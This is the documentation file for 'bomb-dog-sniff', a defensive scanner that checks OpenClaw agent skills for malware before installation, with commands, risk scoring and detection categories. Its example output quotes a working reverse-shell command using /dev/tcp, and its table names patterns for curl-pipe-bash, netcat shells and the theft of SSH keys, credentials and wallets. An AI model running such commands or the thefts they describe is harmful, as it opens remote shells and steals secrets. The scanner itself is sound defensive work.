---
name: bomb-dog-sniff
version: 1.2.0
description: |
  Security-first skill management for OpenClaw - like a bomb-sniffing dog for skills.
  Sniffs out malicious payloads (crypto stealers, keyloggers, reverse shells) before installation.
  Quarantine → Scan → Install only the safe ones.
author: OpenClaw Security Team
homepage: https://github.com/openclaw/skills/bomb-dog-sniff
---

# bomb-dog-sniff v1.2.0 🐕

**Like a bomb-sniffing dog for OpenClaw skills**

Sniff out malicious skills before they explode in your system. Quarantine → Scan → Install only the safe ones.

## What's New in v1.2.0

### Security Hardening
- **Fixed command injection vulnerabilities** in download functions
- **Added path traversal protection** - Sanitizes all path inputs
- **Secure quarantine** - Randomized directory names with restricted permissions
- **Binary file detection** - Skips binary files to avoid false positives
- **File size limits** - Prevents DoS via huge files
- **ReDoS protection** - Limits regex processing on long lines

### Detection Improvements
- **Smart false positive reduction** - Better context-aware pattern matching
- **Entropy analysis** - Detects encoded/encrypted payloads
- **Test file awareness** - Reduces severity for findings in test files
- **Confidence scoring** - Each finding has confidence level (high/medium/low)
- **13 detection categories** - Added supply chain, prototype pollution, and malicious script detection

### New Patterns
- Supply chain attack indicators (typosquatting, dynamic requires)
- Prototype pollution vulnerabilities
- Malicious npm/yarn scripts
- Browser credential theft
- SSH key theft
- Systemd persistence mechanisms

## Quick Start

```bash
# Sniff out threats before installing
openclaw skill bomb-dog-sniff scan ./downloaded-skill

# Safe install from clawhub (auto-downloads, sniffs, installs if clean)
openclaw skill bomb-dog-sniff safe-install cool-skill

# Audit an already-installed skill
openclaw skill bomb-dog-sniff audit bird

# Batch scan multiple skills
openclaw skill bomb-dog-sniff batch skills-to-audit.txt
```

## Commands

### scan

Scan a skill directory for malicious patterns.

```bash
openclaw skill bomb-dog-sniff scan <path> [options]

Options:
  -j, --json          Output JSON only
  -v, --verbose       Show detailed findings
  -t, --threshold N   Set risk threshold (default: 40)
  -h, --help          Show help
```

**Example:**
```bash
openclaw skill bomb-dog-sniff scan ./untrusted-skill
openclaw skill bomb-dog-sniff scan -j ./untrusted-skill > report.json
```

**Output:**
```
🔍 Bomb-Dog-Sniff Security Scanner v1.2.0
Target: /home/user/skills/untrusted-skill

🔴 CRITICAL (2)
──────────────────────────────────────────────────
  crypto_harvester: scripts/wallet.js:23
    Crypto wallet private key harvesting detected
    Code: const privateKey = "a1b2c3..."
    Confidence: high

  reverse_shell: scripts/backdoor.sh:5
    Reverse shell or remote code execution detected
    Code: bash -i >& /dev/tcp/192.168.1.100/4444
    Confidence: high

🟠 HIGH (1)
──────────────────────────────────────────────────
  pipe_bash: install.sh:12
    Dangerous curl | bash pattern detected
    Confidence: high

═══════════════════════════════════════════════════
SCAN SUMMARY
═══════════════════════════════════════════════════
☠️ Risk Score: 75/100
   Risk Level: MALICIOUS
   Duration: 125ms
   Files Scanned: 12/15
   Files Skipped: 3 (binary/empty/large)
   Findings: 3

   Severity Breakdown:
     🔴 CRITICAL: 2
     🟠 HIGH: 1

📋 Recommendation:
   MALICIOUS - Do not install. Found 3 critical security issues.

Scan ID: bds-20260208-a1b2c3d4
```

### safe-install

Download from clawhub/GitHub, scan, and install only if safe.

```bash
openclaw skill bomb-dog-sniff safe-install <source> [options]

Source:
  - ClawHub skill name: bird
  - GitHub URL: https://github.com/user/skill
  - Local path: ./local-skill

Options:
  --threshold N   Set risk threshold (default: 39)
  --dry-run       Scan only, don't install
  --verbose       Show all findings
```

**Example:**
```bash
# Install with default threshold (39)
openclaw skill bomb-dog-sniff safe-install bird

# Stricter threshold
openclaw skill bomb-dog-sniff safe-install cool-skill --threshold 20

# Scan only (dry run)
openclaw skill bomb-dog-sniff safe-install unknown-skill --dry-run

# GitHub source
openclaw skill bomb-dog-sniff safe-install https://github.com/user/cool-skill
```

### audit

Audit an already-installed skill.

```bash
openclaw skill bomb-dog-sniff audit <skill-name> [options]
```

**Example:**
```bash
openclaw skill bomb-dog-sniff audit notion
```

### batch

Scan multiple skills from a list file.

```bash
openclaw skill bomb-dog-sniff batch <list-file>
```

**Example list file (skills.txt):**
```
# My installed skills to audit
bird
notion
gog
slack
./custom-skill

# Commented lines are ignored
# old-skill
```

**Run:**
```bash
openclaw skill bomb-dog-sniff batch skills.txt
```

## Detection Categories

bomb-dog-sniff scans for these threat categories:

| Category | Severity | Examples Detected |
|----------|----------|-------------------|
| **crypto_harvester** | CRITICAL | Private key extraction, wallet exports, mnemonic theft |
| **credential_theft** | CRITICAL | Environment variable exfiltration, config file theft, SSH key theft |
| **reverse_shell** | CRITICAL | Netcat shells, `/dev/tcp/` redirects, socket-based shells, eval of remote code |
| **keylogger** | CRITICAL | Keyboard capture with exfiltration, clipboard theft, password field monitoring |
| **encoded_payload** | HIGH | Base64 execution chains, hex escapes with eval context, obfuscated code |
| **suspicious_api** | HIGH | Pastebin/ngrok/webhook destinations, dynamic URL construction with secrets |
| **pipe_bash** | HIGH | `curl \| bash`, `wget \| sh` patterns |
| **deposit_scam** | HIGH | "Send ETH to 0x...", payment prompts in unexpected contexts |
| **supply_chain** | HIGH | Typosquatting, dynamic requires, suspicious postinstall scripts |
| **prototype_pollution** | HIGH | Dangerous object merging, `__proto__` manipulation |
| **malicious_script** | CRITICAL | Pre/postinstall doing network/exec operations, modifying other packages |
| **network_exfil** | MEDIUM | File reading followed by network transmission |
| **file_tamper** | CRITICAL | `.bashrc` modification, crontab editing, SSH authorized_keys manipulation |

## Risk Scoring

```
0-19   SAFE        ✅ Install freely
20-39  LOW         ⚠️  Review recommended
40-69  SUSPICIOUS  🚫 Blocked by default
70-100 MALICIOUS   ☠️  Never install
```

Each finding adds to the score:
- CRITICAL: +25 points (× confidence multiplier)
- HIGH: +15 points (× confidence multiplier)
- MEDIUM: +5 points (× confidence multiplier)

Confidence multipliers:
- High confidence: 1.0×
- Medium confidence: 0.75×
- Low confidence: 0.5×

Score caps at 100.

## How It Works

### Safe Install Process

```
1. QUARANTINE
   └── Skill downloaded to /tmp/bds-q-<random>/
   └── Randomized, non-predictable directory name
   └── Restricted permissions (0o700)
   
2. SCAN
   ├── Check all files against detection patterns
   ├── Skip binary files, empty files, files >10MB
   ├── Calculate entropy for encoded payload detection
   ├── Apply confidence multipliers
   └── Generate findings report
   
3. DECISION
   ├── Risk > threshold? → BLOCK & DELETE
   └── Risk ≤ threshold? → PROCEED
   
4. INSTALL (if passed)
   └── Move from quarantine to skills directory
   └── Backup existing installation (max 5 backups)
   
5. CLEANUP
   └── Securely remove quarantine directory
```

### Scanning Details

- **Static analysis only** - No code execution
- **Multi-pattern matching** - 60+ detection patterns
- **Line-level reporting** - Exact file:line for each finding
- **False positive reduction** - Context-aware pattern matching
- **Binary detection** - Automatically skips binary files
- **Symlink loop protection** - Tracks visited inodes
- **Depth limiting** - Max 20 directory levels
- **Test file handling** - Reduces severity for test files

## Configuration

### Environment Variables

```bash
# Set custom skills directory
export OPENCLAW_SKILLS_DIR=/path/to/skills

# Set default risk threshold
export BOMB_DOG_THRESHOLD=25
```

### Per-Skill Configuration

Add to your skill's `package.json`:

```json
{
  "bomb-dog-sniff": {
    "riskThreshold": 25,
    "excludedCategories": ["network_exfil"]
  }
}
```

## CI/CD Integration

Add to your CI pipeline:

```yaml
# .github/workflows/skill-security.yml
name: Skill Security Scan

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Scan skills
        run: |
          for skill in skills/*/; do
            echo "Scanning $skill"
            node skills/bomb-dog-sniff/scan.js "$skill" || exit 1
          done
```

Exit codes:
- `0` - Safe (score below threshold)
- `1` - Error/invalid arguments
- `2` - Risky (score ≥ threshold)

## Programmatic API

```javascript
const { scanSkill } = require('./scan');
const { safeDownload } = require('./safe-download');

// Scan a skill
const report = scanSkill('./path/to/skill', { verbose: true });
console.log(`Risk score: ${report.riskScore}`);
console.log(`Findings: ${report.findings.length}`);

// Safe download and install
const result = await safeDownload('cool-skill', {
  autoInstall: true,
  riskThreshold: 30,
});

if (!result.success) {
  console.error('Installation blocked:', result.reason);
}
```

## Security Limits

To prevent DoS and ensure scanner security:

| Limit | Value | Purpose |
|-------|-------|---------|
| Max file size | 10MB | Prevent memory exhaustion |
| Max line length | 10KB | Prevent ReDoS attacks |
| Max files per scan | 10,000 | Prevent resource exhaustion |
| Max findings per file | 100 | Prevent output flooding |
| Max total findings | 500 | Prevent result flooding |
| Max directory depth | 20 | Prevent infinite recursion |
| Download timeout | 2 minutes | Prevent hanging downloads |
| Max download size | 50MB | Prevent disk exhaustion |

## False Positives

If legitimate code triggers a warning:

1. **Check confidence level** - Low confidence findings are more likely to be false positives
2. **Review the excerpt** - Look at the actual code flagged
3. **Test files are noted** - Findings in `*.test.js` or `__tests__/` have reduced severity
4. **Comments are generally skipped** - Unless they contain suspicious keywords

To report false positives, please include:
- The file content that triggered the false positive
- The pattern category that matched
- Expected behavior

## Best Practices

1. **Always scan before installing** unknown skills
2. **Use `--dry-run`** first for untrusted sources
3. **Set lower threshold** (`--threshold 20`) for critical systems
4. **Audit regularly** - Rescan installed skills periodically
5. **Review CRITICAL findings** - Never ignore critical severity warnings
6. **Check confidence levels** - High confidence = higher priority

## Files

- `SKILL.md` - This documentation
- `scan.js` - Core scanner engine
- `patterns.js` - Detection pattern definitions
- `safe-download.js` - Safe download & install logic
- `scripts/sniff.sh` - CLI wrapper
- `package.json` - Package configuration
- `QUICKSTART.md` - Quick reference guide

## Security Notes

⚠️ **Limitations:**
- Static analysis only (some obfuscation may evade detection)
- Pattern-based (novel attacks may not be detected)
- Not a replacement for manual code review on critical systems
- Cannot detect runtime-only malicious behavior

✅ **Recommendations:**
- Use bomb-dog-sniff as first line of defense
- Review code manually for high-security environments
- Keep patterns.js updated with new threat signatures
- Report false positives and missed detections
- Combine with other security tools for defense in depth

## Changelog

### v1.2.0 (Hardened Edition)
- **SECURITY**: Fixed command injection vulnerabilities in safe-download.js
- **SECURITY**: Added path traversal protection
- **SECURITY**: Secure randomized quarantine directories
- **FEATURE**: Binary file detection and skipping
- **FEATURE**: File size limits (10MB per file, 50MB download)
- **FEATURE**: Entropy analysis for encoded payload detection
- **FEATURE**: Confidence scoring for all findings
- **FEATURE**: Test file awareness with severity reduction
- **FEATURE**: 3 new detection categories (supply_chain, prototype_pollution, malicious_script)
- **IMPROVEMENT**: Better false positive reduction with context-aware matching
- **IMPROVEMENT**: ReDoS protection via line length limits
- **IMPROVEMENT**: Symlink loop protection
- **IMPROVEMENT**: Backup rotation (max 5 backups)

### v1.1.0
- Added `safe-install` command with quarantine workflow
- Added `audit` command for installed skills
- Added `batch` command for multiple skill scanning
- Enhanced detection patterns (50+ signatures)
- Added risk threshold configuration

### v1.0.0
- Initial release with basic scanning
- 10 detection categories
- JSON output format

## License

MIT - See LICENSE file

---

**Stay safe. Scan everything. Trust verified skills only.** 🦞🐕
